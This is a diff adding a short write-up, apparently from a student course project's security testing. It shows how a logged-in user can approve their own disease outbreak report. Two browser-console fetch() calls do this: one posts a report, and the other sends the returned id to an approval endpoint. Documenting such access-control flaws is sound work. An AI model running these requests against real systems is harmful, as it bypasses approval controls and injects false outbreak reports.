@@ -1,0 +1,30 @@
+Attack 1: Self approving report
+
+1. Login
+2. Submit a report
+3. Open dev tools
+4. In the console, paste the following commands:
+    a. fetch("https://cattle.cse.buffalo.edu/CSE442/2026-Spring/cse-442c/backend/public/api/create_outbreak.php", {
+         method: "POST",
+        credentials: "include",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ diseaseType: "H5N1 (Avian Flu)", location: "Texas" })
+        }).then(r => r.json()).then(console.log)
+
+
+
+
+    b. fetch("https://cattle.cse.buffalo.edu/CSE442/2026-Spring/cse-442c/backend/public/api/approveOutbreak.php", {
+        method: "POST",
+        credentials: "include",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id: <placeholder>)   
+        }).then(r => r.json()).then(console.log)
+
+    NOTE: <placeholder> should be replaced with insert_id from the response of the first command
+
+
+5. Go back to the website to verify the report is visible 
+
+
+
